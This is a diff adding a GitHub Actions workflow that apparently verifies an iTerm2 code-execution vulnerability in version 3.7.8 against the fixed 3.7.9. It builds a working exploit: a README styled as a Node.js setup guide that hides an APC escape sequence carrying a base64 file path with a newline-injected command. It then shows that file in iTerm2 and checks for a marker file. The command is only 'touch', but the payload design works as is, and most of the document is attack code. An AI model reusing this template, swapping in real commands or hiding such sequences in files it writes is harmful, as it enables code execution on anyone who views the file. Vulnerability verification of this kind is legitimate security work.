@@ -1,0 +1,194 @@
+name: iterm2-cve-verify
+
+on:
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'iTerm2 版本 (3.7.8 = 有漏洞, 3.7.9 = 已修复)'
+        required: true
+        default: '3.7.8'
+      mode:
+        description: '测试模式'
+        required: true
+        default: 'osascript'
+        type: choice
+        options:
+          - osascript
+          - open
+          - direct
+
+jobs:
+  verify:
+    runs-on: macos-13
+    timeout-minutes: 25
+
+    steps:
+      - name: 环境信息
+        run: |
+          echo "=== System ==="
+          sw_vers
+          uname -a
+          echo ""
+          echo "=== GUI Session ==="
+          who
+          echo "console user: $(stat -f%Su /dev/console)"
+          echo ""
+          echo "=== WindowServer ==="
+          pgrep -l WindowServer || echo "no WindowServer"
+          echo ""
+          echo "=== Accessibility (TCC) ==="
+          sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
+            "select service, client, auth_value from access" 2>/dev/null | head -20 || echo "no TCC db access"
+
+      - name: 下载 iTerm2
+        env:
+          VER: ${{ inputs.version }}
+        run: |
+          set -eux
+          V=$(echo "$VER" | tr '.' '_')
+          URL="https://iterm2.com/downloads/stable/iTerm2-${V}.zip"
+          echo "URL=$URL"
+          curl -L --max-time 300 -o /tmp/i.zip "$URL"
+          ls -la /tmp/i.zip
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          echo "=== Version ==="
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          echo "=== Binary ==="
+          ls -la /tmp/i/iTerm.app/Contents/MacOS/
+
+      - name: 验证二进制符号（决定版本是否有漏洞）
+        run: |
+          BIN=/tmp/i/iTerm.app/Contents/MacOS/iTerm2
+          echo "=== 检查修复符号 ==="
+          for sym in it_reportUnsafeControlCharacterSet stringByReplacingControlCharactersWithSpace; do
+            C=$(strings -a "$BIN" | grep -c "$sym" || true)
+            echo "  $sym = $C"
+          done
+          echo ""
+          echo "=== 检查漏洞相关符号 ==="
+          for sym in executeAPC respondToTransmit filenameIsSafe screenSendReportData; do
+            C=$(strings -a "$BIN" | grep -c "$sym" || true)
+            echo "  $sym = $C"
+          done
+
+      - name: 生成 payload
+        run: |
+          python3 -c "
+import base64
+cmd = 'touch PWNED_ITERM2'
+assert '/' not in cmd and '\"' not in cmd
+fp = f'/tmp/x\n{cmd}\nz'
+b64 = base64.b64encode(fp.encode()).decode()
+apc = f'\x1b_Ga=T,f=100,t=f,i=1;{b64}\x1b\\'
+readme = f'''# Setup Guide
+
+## Prerequisites
+- Node.js 18+
+{apc}
+## Install
+npm install
+'''
+open('/tmp/payload.md','w').write(readme)
+print(f'payload: {len(readme)} bytes')
+print(f'apc: {len(apc.encode())} bytes')
+print(f'fp: {fp!r}')
+"
+          echo "=== payload hexdump（前 350 字节）==="
+          head -c 350 /tmp/payload.md | od -c | head -25
+
+      - name: 清理标记
+        run: |
+          rm -f ~/PWNED_ITERM2 /tmp/PWNED_ITERM2
+          echo "cleaned"
+
+      - name: 启动 iTerm2 并喂 payload
+        env:
+          MODE: ${{ inputs.mode }}
+        run: |
+          set -x
+          MODE="${MODE:-osascript}"
+          echo "=== mode: $MODE ==="
+
+          # 启动 iTerm2
+          open -a /tmp/i/iTerm.app
+          sleep 10
+          pgrep -l iTerm || echo "iTerm not running!"
+
+          if [ "$MODE" = "osascript" ]; then
+            cat > /tmp/drive.scpt <<'SCPT'
+            tell application "iTerm2"
+              activate
+              delay 3
+              set w to (create window with default profile)
+              delay 2
+              tell current session of w
+                write text "cat /tmp/payload.md"
+              end tell
+              delay 6
+            end tell
+            SCPT
+            osascript /tmp/drive.scpt 2>&1 || echo "osascript failed"
+
+          elif [ "$MODE" = "open" ]; then
+            # 用 iTerm2 打开文件
+            open -a /tmp/i/iTerm.app --args /tmp/payload.md
+            sleep 8
+
+          elif [ "$MODE" = "direct" ]; then
+            # 直接找 iTerm2 的 PTY 写数据
+            echo "=== 找 iTerm2 相关进程 ==="
+            ps aux | grep -i iterm | grep -v grep
+            echo ""
+            echo "=== 尝试用 lsof 找 PTY ==="
+            lsof -c iTerm 2>/dev/null | grep -E "tty|pts" | head -10 || echo "none"
+          fi
+
+          sleep 10
+          echo "=== iTerm2 进程 ==="
+          pgrep -l iTerm || echo "not running"
+
+      - name: 检查结果
+        if: always()
+        run: |
+          echo "================================================================"
+          echo "结果检查"
+          echo "================================================================"
+
+          HIT=0
+          for f in ~/PWNED_ITERM2 /tmp/PWNED_ITERM2 PWNED_ITERM2; do
+            if [ -f "$f" ]; then
+              echo "[RESULT] VULNERABLE — 找到标记: $f"
+              ls -la "$f"
+              HIT=1
+            fi
+          done
+
+          if [ "$HIT" = "0" ]; then
+            echo "[RESULT] NOT_EXPLOITED — 未找到标记"
+            echo ""
+            echo "=== 当前目录 ==="
+            pwd && ls -la
+            echo ""
+            echo "=== HOME ==="
+            ls -la ~ | head -30
+            echo ""
+            echo "=== /tmp ==="
+            ls -lat /tmp | head -20
+          fi
+
+      - name: 抓图
+        if: always()
+        run: |
+          screencapture -x /tmp/screen.png 2>/dev/null && echo "截图成功" || echo "截图失败"
+          ls -la /tmp/screen.png 2>/dev/null || true
+
+      - name: 上传证据
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: evidence-${{ inputs.version }}-${{ inputs.mode }}
+          path: |
+            /tmp/payload.md
+            /tmp/screen.png
+          if-no-files-found: warn
